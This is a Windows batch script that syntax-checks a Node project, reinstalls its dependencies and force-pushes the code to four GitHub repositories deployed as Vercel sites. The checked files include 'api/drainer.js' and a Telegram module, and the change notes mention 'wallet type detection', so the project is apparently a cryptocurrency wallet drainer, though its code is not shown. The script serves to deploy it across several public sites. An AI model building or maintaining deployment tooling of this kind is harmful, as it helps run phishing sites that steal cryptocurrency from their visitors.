@echo off
echo ========================================
echo VERIFICATION AND FORCE PUSH SCRIPT
echo ========================================
echo.
echo Changing to correct directory...
cd /d "C:\Users\popsl\Downloads\Emi-lokan-main"
echo.
echo Current directory:
cd
echo.
echo ========================================
echo STEP 1: VERIFYING GIT STATUS
echo ========================================
echo.
echo Checking if this is a git repository...
if not exist ".git" (
    echo ERROR: Not in a git repository!
    echo Please run this script from the Emi-lokan-main directory.
    pause
    exit /b 1
)
echo Git repository found!
echo.
echo Current git status:
git status
echo.
echo ========================================
echo STEP 2: VERIFYING CODE SYNTAX
echo ========================================
echo.
echo Checking server.js syntax...
node -c server.js
if %errorlevel% neq 0 (
    echo ERROR: server.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ server.js syntax OK
echo.
echo Checking api/drainer.js syntax...
node -c api/drainer.js
if %errorlevel% neq 0 (
    echo ERROR: api/drainer.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ api/drainer.js syntax OK
echo.
echo Checking src/telegram.js syntax...
node -c src/telegram.js
if %errorlevel% neq 0 (
    echo ERROR: src/telegram.js has syntax errors!
    pause
    exit /b 1
)
echo ✓ src/telegram.js syntax OK
echo.
echo ========================================
echo STEP 3: VERIFYING PACKAGE.JSON
echo ========================================
echo.
echo Checking package.json...
node -e "JSON.parse(require('fs').readFileSync('package.json', 'utf8')); console.log('✓ package.json syntax OK');"
if %errorlevel% neq 0 (
    echo ERROR: package.json has syntax errors!
    pause
    exit /b 1
)
echo.
echo ========================================
echo STEP 4: CLEANING CACHES
echo ========================================
echo.
echo Cleaning Git cache...
git gc --aggressive --prune=now
echo.
echo Cleaning npm cache...
npm cache clean --force
echo.
echo ========================================
echo STEP 5: VERIFYING DEPENDENCIES
echo ========================================
echo.
echo Installing dependencies...
npm install
if %errorlevel% neq 0 (
    echo ERROR: Failed to install dependencies!
    pause
    exit /b 1
)
echo ✓ Dependencies installed successfully
echo.
echo ========================================
echo STEP 6: FORCE PUSHING TO ALL REPOS
echo ========================================
echo.
echo Checking current branch...
for /f "tokens=*" %%i in ('git branch --show-current') do set CURRENT_BRANCH=%%i
echo Current branch: %CURRENT_BRANCH%
echo.
echo Force pushing to all repositories...
echo.
echo Pushing to MISUSE repository...
git remote add misuse https://github.com/SacredPath/MISUSE.git
git fetch misuse
git push misuse %CURRENT_BRANCH%:main --force
git remote remove misuse
echo.
echo Pushing to XENA repository...
git remote add xena https://github.com/SacredPath/XENA.git
git fetch xena
git push xena %CURRENT_BRANCH%:main --force
git remote remove xena
echo.
echo Pushing to Mambo repository...
git remote add mambo https://github.com/SacredPath/Mambo.git
git fetch mambo
git push mambo %CURRENT_BRANCH%:main --force
git remote remove mambo
echo.
echo Pushing to Uranus repository...
git remote add uranus https://github.com/SacredPath/Uranus.git
git fetch uranus
git push uranus %CURRENT_BRANCH%:main --force
git remote remove uranus
echo.
echo ========================================
echo VERIFICATION COMPLETE
echo ========================================
echo.
echo ✓ All syntax checks passed
echo ✓ All dependencies installed
echo ✓ All caches cleaned
echo ✓ Force pushed to all repositories
echo.
echo Summary of latest changes:
echo - Fixed Telegram unauthorized error
echo - Updated connection timeout handling
echo - Improved wallet type detection
echo - Removed duplicate logging
echo - Added graceful error handling
echo.
echo Test sites:
echo - MISUSE: https://misuse.vercel.app
echo - XENA: https://xena-brown.vercel.app
echo - Mambo: https://mambo-azure.vercel.app
echo - Uranus: https://uranus.vercel.app
echo.
echo All repositories have been updated with the latest fixes!
pause
